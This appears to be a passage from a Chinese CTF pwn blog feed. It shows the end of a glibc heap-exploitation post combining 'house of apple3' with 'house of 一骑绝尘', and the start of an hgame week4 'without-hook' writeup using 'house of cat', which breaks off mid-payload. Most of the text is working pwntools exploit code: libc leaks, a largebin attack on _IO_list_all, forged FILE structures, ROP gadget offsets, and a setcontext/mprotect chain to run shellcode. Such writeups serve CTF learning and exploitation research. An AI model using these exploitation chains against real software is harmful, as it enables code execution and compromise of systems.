binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1f8a20</span><br>    _IO_wide_data_1 = libc_base + <span class="hljs-number">0x1f69a0</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base + <span class="hljs-number">0x1f3240</span><br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base<br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_llist_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">2</span>)<br>heap = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>show(<span class="hljs-number">0</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1f6cc0</span> - <span class="hljs-number">0x20</span><br><br>get_gadgets(libc_base)<br><br><span class="hljs-comment"># libc-2.37-1</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x00000000000240e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002573e</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000026302</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000040123</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000008b966</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x510</span>)<br><br>payload = p64(libc_base + <span class="hljs-number">0x1f7100</span>) * <span class="hljs-number">2</span> + p64(heap + <span class="hljs-number">0x290</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, payload)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x540</span>)<br><br>edit(<span class="hljs-number">1</span>, payload)<br><br>fake_IO_file_addr = heap + <span class="hljs-number">0xcf0</span><br>fake_ucontext_addr = fake_IO_file_addr + <span class="hljs-number">0x100</span> <br><br><span class="hljs-comment"># house of apple3</span><br>fake_IO_file = p64(<span class="hljs-number">0xffffffffffffffff</span>)<span class="hljs-comment">#_IO_read_endtable</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>) <br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr + <span class="hljs-number">0x100</span>)<span class="hljs-comment"># _IO_buf_end = fake_addr</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr + <span class="hljs-number">0x40</span>)<span class="hljs-comment">#  _codecvt</span><br>fake_IO_file += p64(_IO_wide_data_1)<span class="hljs-comment"># 尽量保持不变</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(_IO_wfile_jumps + <span class="hljs-number">0x8</span>)<span class="hljs-comment"># vtable</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># fake_ucontext_addr</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>fake_IO_file += p64(setcontext)<br><br>rdi  = fake_ucontext_addr &amp; ~<span class="hljs-number">0xfff</span>  <span class="hljs-comment"># heap_addr binsh_addr</span><br>rsi  = <span class="hljs-number">0x1000</span>      <br>rbp  = fake_ucontext_addr  + <span class="hljs-number">0x100</span><br>rbx  = <span class="hljs-number">0</span><br>rdx  = <span class="hljs-number">7</span><br>rcx  = <span class="hljs-number">0</span><br>rax  = <span class="hljs-number">0</span><br>rsp  = fake_ucontext_addr + <span class="hljs-number">0x100</span><br>rip  = mprotect<br><br>ucontext = <span class="hljs-string">b&#x27;&#x27;</span><br>ucontext += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br>ucontext += p64(rdi) + p64(rsi)<br>ucontext += p64(rbp) + p64(rbx)<br>ucontext += p64(rdx) + p64(rcx)<br>ucontext += p64(rax)<br>ucontext += p64(rsp) + p64(rip)<br>ucontext = ucontext.ljust((<span class="hljs-number">0xe0</span> - <span class="hljs-number">0x30</span>), <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>ucontext += p64(heap + <span class="hljs-number">0x1000</span>)<br>ucontext = ucontext.ljust((<span class="hljs-number">0x100</span> - <span class="hljs-number">0x30</span>), <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>shellcode = p64(fake_ucontext_addr + <span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0</span>) + asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>payload = fake_IO_file + ucontext + <span class="hljs-built_in">bytes</span>(shellcode)<br><br>edit(<span class="hljs-number">2</span>, payload)<br><br>gdb.attach(p, <span class="hljs-string">&#x27;b setcontext&#x27;</span>)<br>pause()<br><br>_exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><strong>house of apple3的调用链，最终执行到setcontext</strong></p><p><img src="/img/house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/image-20230216140325429.png" alt="image-20230216140325429"></p><p><img src="/img/house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/image-20230216140540993.png" alt="image-20230216140540993"></p><p><strong>调用mpotect，执行我们的orw</strong></p><p><img src="/img/house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/image-20230216140705434.png" alt="image-20230216140705434"></p><p><img src="/img/house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/image-20230216140644206.png" alt="image-20230216140644206"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章结合了<strong>house of apple3</strong>与<strong>house of 一骑绝尘</strong>。容易想到的是，<strong>house of 一骑绝尘</strong>还可以与<strong>house of apple2</strong>，甚至其他的house of 系列结合，比如<a href="https://bbs.kanxue.com/user-home-894406.htm">我超啊师傅</a>同时提出的house of 魑魅魍魉。不得不说，师傅们真的太强了，向师傅们学习。</p><p><strong>参考文章：</strong></p><p><a href="https://bbs.kanxue.com/thread-276056.htm">https://bbs.kanxue.com/thread-276056.htm</a></p><p><a href="https://bbs.kanxue.com/thread-273863.htm">https://bbs.kanxue.com/thread-273863.htm</a></p>]]></content>
    
    
    <categories>
      
      <category>house系列</category>
      
    </categories>
    
    
    <tags>
      
      <tag>house系列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-hgame-week4</title>
    <link href="/2023/02/06/2022-hgame-week4/"/>
    <url>/2023/02/06/2022-hgame-week4/</url>
    
    <content type="html"><![CDATA[<h1 id="hgame-week4-PWN"><a href="#hgame-week4-PWN" class="headerlink" title="hgame week4 PWN"></a>hgame week4 PWN</h1><h2 id="without-hook"><a href="#without-hook" class="headerlink" title="without-hook"></a>without-hook</h2><p>本题是标准的菜单堆题，白给的uaf漏洞，唯一的难点就是使用了libc-2.36-2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/haha2022/tools/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6&#x27;)</span><br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect, _IO_list_all<br>    <span class="hljs-keyword">global</span> _IO_stdfile_2_lock, _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1f8a10</span><br>    <span class="hljs-comment"># _IO_stdfile_2_lock = libc_base + 0x1f8a20</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base + <span class="hljs-number">0x1f30a0</span><br>    <span class="hljs-comment"># _IO_wfile_jumps = libc_base + 0x1f3240</span><br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base<br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_list_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">2</span>)<br>heap = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>show(<span class="hljs-number">0</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1f6cc0</span><br><br>get_gadgets(libc_base)<br><br><span class="hljs-comment"># libc-2.36-4</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023b65</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x00000000000251be</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000166262</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x000000000003fa43</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000008cc36</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br><span class="hljs-comment"># libc-2.36-2</span><br><span class="hljs-comment"># pop_rdi_ret = libc_base + 0x0000000000023ba5</span><br><span class="hljs-comment"># pop_rsi_ret = libc_base + 0x00000000000251fe</span><br><span class="hljs-comment"># pop_rdx_rbx_ret = libc_base + 0x000000000008bbb9</span><br><span class="hljs-comment"># pop_rax_ret = libc_base + 0x000000000003f923</span><br><span class="hljs-comment"># syscall_ret = libc_base + 0x000000000008cb16</span><br><span class="hljs-comment"># ret = pop_rdi_ret + 1</span><br><br><span class="hljs-comment"># libc-2.37-1</span><br><span class="hljs-comment"># pop_rdi_ret = libc_base + 0x00000000000240e5</span><br><span class="hljs-comment"># pop_rsi_ret = libc_base + 0x000000000002573e</span><br><span class="hljs-comment"># pop_rdx_ret = libc_base + 0x0000000000026302</span><br><span class="hljs-comment"># pop_rax_ret = libc_base + 0x0000000000040123</span><br><span class="hljs-comment"># syscall_ret = libc_base + 0x000000000008b966</span><br><span class="hljs-comment"># ret = pop_rdi_ret + 1</span><br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x510</span>)<br><br>payload = p64(libc_base + <span class="hljs-number">0x1f7100</span>) * <span class="hljs-number">2</span> + p64(heap + <span class="hljs-number">0x290</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, payload)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x540</span>)<br><br>fake_IO_file_addr = heap + <span class="hljs-number">0xcf0</span><br><br><span class="hljs-comment"># house of cat</span><br>fake_IO_file = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> <span class="hljs-comment"># wide_data</span><br>fake_IO_file += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># wide_data -&gt; _IO_write_base = rcx != 0</span><br>fake_IO_file +=p64(heap + <span class="hljs-number">0x7d0</span>)<span class="hljs-comment"># fp-&gt;_IO_backup_base = rdxwide_data -&gt; _IO_write_ptr</span><br>fake_IO_file +=p64(setcontext + <span class="hljs-number">61</span>)<span class="hljs-comment"># fp-&gt;_IO_save_end = call addr(call setcontext)</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(_IO_stdfile_2_lock)  <span class="hljs-comment"># _lock = writable address / _IO_stdfile_2_lock</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment"># _wide_data</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _mode != 0</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(_IO_wfile_jumps + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># vtable0xd0</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr+<span class="hljs-number">0x40</span>)  <span class="hljs-comment"># fake_IO_wide_jumps</span><br><br>edit(<span class="hljs-number">2</span>, 